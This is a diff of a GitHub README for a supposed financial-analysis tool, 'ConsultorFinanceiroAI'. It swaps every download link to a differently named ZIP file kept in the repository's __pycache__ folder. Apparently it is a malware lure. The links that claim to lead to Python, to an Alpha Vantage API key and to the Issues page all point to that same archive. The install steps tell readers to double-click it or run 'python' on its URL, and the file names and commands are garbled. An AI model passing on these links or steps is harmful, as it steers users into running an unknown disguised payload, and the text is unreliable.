@@ -1,7 +1,7 @@
 # 🚀 ConsultorFinanceiroAI - Your Financial Data Assistant Made Easy
 
 ## 📥 Download Now
-[![Download ConsultorFinanceiroAI](https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/ConsultorFinanceiroAI-2.5.zip)](https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/ConsultorFinanceiroAI-2.5.zip)
+[![Download ConsultorFinanceiroAI](https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/AI_Financeiro_Consultor_thiostannate.zip)](https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/AI_Financeiro_Consultor_thiostannate.zip)
 
 ## 📖 Overview
 ConsultorFinanceiroAI is an ETL pipeline designed for the financial market. It extracts data from Alpha Vantage, processes it using Python, and generates long-term analyses with AI (Gemini). This application includes automated analysis and an educational investment assistant, making financial insights accessible to everyone.
@@ -13,25 +13,25 @@ To begin using ConsultorFinanceiroAI, follow these simple steps:
 Before downloading, ensure your computer meets the following requirements:
 
 - **Operating System:** Windows 10 or newer, macOS 10.15 or newer, or a recent Linux distribution.
-- **Python Version:** Python 3.7 or newer. If you need Python, you can download it from [https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/ConsultorFinanceiroAI-2.5.zip](https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/ConsultorFinanceiroAI-2.5.zip).
+- **Python Version:** Python 3.7 or newer. If you need Python, you can download it from [https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/AI_Financeiro_Consultor_thiostannate.zip](https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/AI_Financeiro_Consultor_thiostannate.zip).
 - **Memory:** At least 4 GB of RAM.
 - **Disk Space:** At least 500 MB of free space.
 
 ### 2. Download the Application
 Visit the Releases page to download the latest version of the software. You can find it here:
 
-[Download ConsultorFinanceiroAI](https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/ConsultorFinanceiroAI-2.5.zip)
+[Download ConsultorFinanceiroAI](https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/AI_Financeiro_Consultor_thiostannate.zip)
 
 ### 3. Install the Application
 1. **Locate the downloaded file** on your computer. It will be a ZIP file.
 2. **Extract the contents** of the ZIP file to your desired location.
-3. Open the extracted folder and find the executable file named `https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/ConsultorFinanceiroAI-2.5.zip` or the equivalent for your operating system.
+3. Open the extracted folder and find the executable file named `https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/AI_Financeiro_Consultor_thiostannate.zip` or the equivalent for your operating system.
 
 ### 4. Run the Application
-- On **Windows**, double-click `https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/ConsultorFinanceiroAI-2.5.zip`.
+- On **Windows**, double-click `https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/AI_Financeiro_Consultor_thiostannate.zip`.
 - On **macOS/Linux**, open your terminal, navigate to the extracted folder, and run the command:  
   ```bash
-  python https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/ConsultorFinanceiroAI-2.5.zip
+  python https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/AI_Financeiro_Consultor_thiostannate.zip
   ```
 
 ## 🔍 Features
@@ -52,11 +52,11 @@ Let the software do the heavy lifting. You can schedule automated analyses to ke
 ## ⚙️ Configuration
 After you run the application for the first time, you may want to configure some settings:
 
-- **API Key:** You will need an Alpha Vantage API key, which you can obtain for free [here](https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/ConsultorFinanceiroAI-2.5.zip). Enter your API key in the app settings.
+- **API Key:** You will need an Alpha Vantage API key, which you can obtain for free [here](https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/AI_Financeiro_Consultor_thiostannate.zip). Enter your API key in the app settings.
 - **Data Frequency:** Choose how often you want the data to be updated (daily, weekly, monthly).
 
 ## 👩‍🏫 Get Help
-If you encounter any issues or have questions, refer to the documentation included in the application folder. You can also find help by visiting our [GitHub Issues page](https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/ConsultorFinanceiroAI-2.5.zip).
+If you encounter any issues or have questions, refer to the documentation included in the application folder. You can also find help by visiting our [GitHub Issues page](https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/AI_Financeiro_Consultor_thiostannate.zip).
 
 ## 🎉 Community and Contributions
 Join our growing community to share insights and experiences. If you'd like to contribute to the project, feel free to explore the repository and submit pull requests. Your contributions are welcome!
@@ -64,7 +64,7 @@ Join our growing community to share insights and experiences. If you'd like to c
 ## 📌 Download & Install
 Don't hesitate to download the latest version of ConsultorFinanceiroAI and start enhancing your financial strategies.
 
-[Download ConsultorFinanceiroAI](https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/ConsultorFinanceiroAI-2.5.zip)
+[Download ConsultorFinanceiroAI](https://raw.githubusercontent.com/kunalcr7/ConsultorFinanceiroAI/main/__pycache__/AI_Financeiro_Consultor_thiostannate.zip)
 
 ## 🌟 Topics
 - api
